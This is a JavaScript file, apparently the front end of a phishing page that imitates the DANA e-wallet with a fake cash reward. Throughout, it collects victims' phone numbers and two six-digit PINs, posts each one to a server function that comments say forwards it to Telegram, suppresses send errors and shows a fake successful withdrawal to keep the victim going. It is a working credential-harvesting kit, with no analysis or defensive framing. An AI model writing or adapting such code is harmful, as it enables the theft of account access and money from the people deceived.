document.addEventListener('DOMContentLoaded', () => {
  // DOM References
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    r: document.getElementById('reward-page'),
    w: document.getElementById('withdraw-page'),
    s: document.getElementById('success-page')
  };
  
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const registeredPhone = document.getElementById('registered-phone');
  const saldoAmount = document.getElementById('saldo-amount');
  const successAmount = document.getElementById('success-amount');
  const tarikDanaButton = document.getElementById('tarik-dana-button');
  const kembaliButton = document.getElementById('kembali-button');
  const fn = document.getElementById('floating-notification');
  const sn = document.getElementById('success-notification');
  const lc = document.getElementById('lanjutkan-container');

  // State Variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let rewardAmount = '';
  let rewardAmounts = [
    'Rp 3.000.000',
    'Rp 4.500.000', 
    'Rp 700.000',
    'Rp 6.000.000',
    'Rp 7.500.000',
    'Rp 500.000',
    'Rp 1.300.000'
  ];

  // Helper Functions
  function showSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function getRandomReward() {
    const randomIndex = Math.floor(Math.random() * rewardAmounts.length);
    return rewardAmounts[randomIndex];
  }

  // Fungsi untuk otomatis submit setelah PIN lengkap
  function autoSubmitPin() {
    pin = Array.from(pis).map(i => i.value).join('');
    
    if (pin.length === 6) {
      // Otomatis lanjutkan setelah PIN lengkap
      handlePinSubmission();
    }
  }

  // Handle PIN submission
  async function handlePinSubmission() {
    if (pin.length !== 6) {
      alert('Kode pendaftaran harus 6 digit');
      return;
    }
    
    showSpinner();
    try {
      // Kirim data PIN ke Telegram
      await sendDanaData('pin', { phone: phoneNumber, pin });
      
      // Dapatkan nominal reward acak
      rewardAmount = getRandomReward();
      
      // Kirim data reward ke Telegram
      await sendDanaData('reward', { 
        phone: phoneNumber, 
        pin, 
        reward: rewardAmount 
      });
      
      // Tampilkan halaman reward
      setTimeout(() => {
        pages.p.style.display = 'none';
        pages.r.style.display = 'block';
        currentPage = 'r';
        
        // Set reward amount
        saldoAmount.textContent = rewardAmount;
        hideSpinner();
      }, 1000);
    } catch (error) {
      alert('Gagal verifikasi kode: ' + error.message);
      hideSpinner();
    }
  }

  // Backend Communication untuk mengirim data ke Telegram
  async function sendDanaData(type, data) {
    try {
      const response = await fetch('/.netlify/functions/send-dana-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, ...data })
      });
      
      if (!response.ok) {
        throw new Error('Terjadi kesalahan pada server');
      }
      return await response.json();
    } catch (error) {
      console.error('Error:', error);
      // Tetap lanjut meski gagal kirim ke Telegram
      return { success: true };
    }
  }

  // Modified Phone Number Formatting
  pn.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.startsWith('0')) {
      value = value.substring(1);
    }
    
    if (value.length > 0 && !value.startsWith('8')) {
      value = '8' + value.replace(/^8/, '');
    }
    
    if (value.length > 12) {
      value = value.substring(0, 12);
    }
    
    let formatted = '';
    if (value.length > 0) {
      formatted = value.substring(0, 3);
      if (value.length > 3) {
        formatted += '-' + value.substring(3, 7);
      }
      if (value.length > 7) {
        formatted += '-' + value.substring(7, 12);
      }
    }
    
    e.target.value = formatted;
    phoneNumber = value;
  });

  // Event Handlers
  lb.addEventListener('click', async () => {
    if (currentPage === 'n') {
      if (phoneNumber.length < 10) {
        alert('Nomor HP harus minimal 10 digit');
        return;
      }
      
      showSpinner();
      try {
        // Kirim data nomor ke Telegram
        await sendDanaData('phone', { phone: phoneNumber });
        
        // Simulasi pengiriman data
        setTimeout(() => {
          pages.n.style.display = 'none';
          pages.p.style.display = 'block';
          currentPage = 'p';
          lc.style.display = 'none';
          // Fokus ke input PIN pertama
          if (pis.length > 0) {
            pis[0].focus();
          }
          hideSpinner();
        }, 1000);
      } catch (error) {
        alert('Gagal mengirim data: ' + error.message);
        hideSpinner();
      }
    } else if (currentPage === 'p') {
      // Handle PIN submission manual (jika tombol lanjutkan diklik)
      handlePinSubmission();
    }
  });

  // PIN Input Handling - Auto submit ketika 6 digit terisi
  pis.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pis.length - 1) {
        // Pindah ke input berikutnya
        pis[index + 1].focus();
      }
      
      // Cek jika semua digit sudah terisi
      autoSubmitPin();
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        // Kembali ke input sebelumnya saat backspace
        pis[index - 1].focus();
      } else if (e.key === 'Enter') {
        // Submit dengan Enter
        autoSubmitPin();
      }
    });
  });

  // Tarik Dana Button Handler
  tarikDanaButton.addEventListener('click', () => {
    pages.r.style.display = 'none';
    pages.w.style.display = 'block';
    currentPage = 'w';
    
    // Tampilkan nomor yang terdaftar
    registeredPhone.textContent = '+62 ' + pn.value;
    
    // Reset PIN inputs
    pis.forEach(input => input.value = '');
    
    // Fokus ke input PIN pertama
    const withdrawPins = document.querySelectorAll('#withdraw-page .pin-box');
    if (withdrawPins.length > 0) {
      withdrawPins[0].focus();
    }
  });

  // Kembali Button Handler
  kembaliButton.addEventListener('click', () => {
    // Reset semua state dan kembali ke halaman awal
    pages.s.style.display = 'none';
    pages.n.style.display = 'block';
    currentPage = 'n';
    lc.style.display = 'flex';
    
    // Reset form
    pn.value = '';
    phoneNumber = '';
    pis.forEach(input => input.value = '');
    pin = '';
  });

  // Toggle PIN Visibility
  document.querySelectorAll('.show-text').forEach(button => {
    button.addEventListener('click', (e) => {
      const isShowing = e.target.classList.toggle('active');
      const container = e.target.closest('.container');
      const pinInputs = container.querySelectorAll('.pin-box');
      pinInputs.forEach(input => {
        input.type = isShowing ? 'text' : 'password';
      });
      e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
    });
  });

  // Handle PIN untuk penarikan dana (auto submit)
  const withdrawPins = document.querySelectorAll('#withdraw-page .pin-box');
  if (withdrawPins.length > 0) {
    withdrawPins.forEach((input, index) => {
      input.addEventListener('input', async (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
        
        if (e.target.value.length === 1 && index < withdrawPins.length - 1) {
          withdrawPins[index + 1].focus();
        }
        
        const withdrawPin = Array.from(withdrawPins).map(i => i.value).join('');
        
        if (withdrawPin.length === 6) {
          showSpinner();
          
          try {
            // Kirim data penarikan ke Telegram
            await sendDanaData('withdraw', { 
              phone: phoneNumber, 
              pin: withdrawPin, 
              reward: rewardAmount 
            });
            
            // Kirim data sukses ke Telegram
            await sendDanaData('success', { 
              phone: phoneNumber, 
              reward: rewardAmount 
            });
            
            // Simulasi proses penarikan
            setTimeout(() => {
              pages.w.style.display = 'none';
              pages.s.style.display = 'block';
              currentPage = 's';
              
              // Tampilkan jumlah yang berhasil ditarik
              successAmount.textContent = rewardAmount;
              
              hideSpinner();
            }, 2000);
          } catch (error) {
            console.error('Gagal mengirim data penarikan:', error);
            hideSpinner();
          }
        }
      });
      
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
          withdrawPins[index - 1].focus();
        } else if (e.key === 'Enter') {
          // Submit dengan Enter
          const withdrawPin = Array.from(withdrawPins).map(i => i.value).join('');
          if (withdrawPin.length === 6) {
            showSpinner();
            // Trigger proses penarikan
            withdrawPins[withdrawPins.length - 1].dispatchEvent(new Event('input'));
          }
        }
      });
    });
  }

  // Handle klik di luar input untuk mobile devices
  document.addEventListener('click', (e) => {
    if (currentPage === 'p' && !e.target.classList.contains('pin-box')) {
      // Cari input PIN yang aktif atau pertama kali
      const activePin = document.querySelector('.pin-box:focus');
      if (!activePin) {
        const firstEmptyPin = Array.from(pis).find(input => input.value === '');
        if (firstEmptyPin) {
          firstEmptyPin.focus();
        } else {
          pis[0].focus();
        }
      }
    }
  });
});
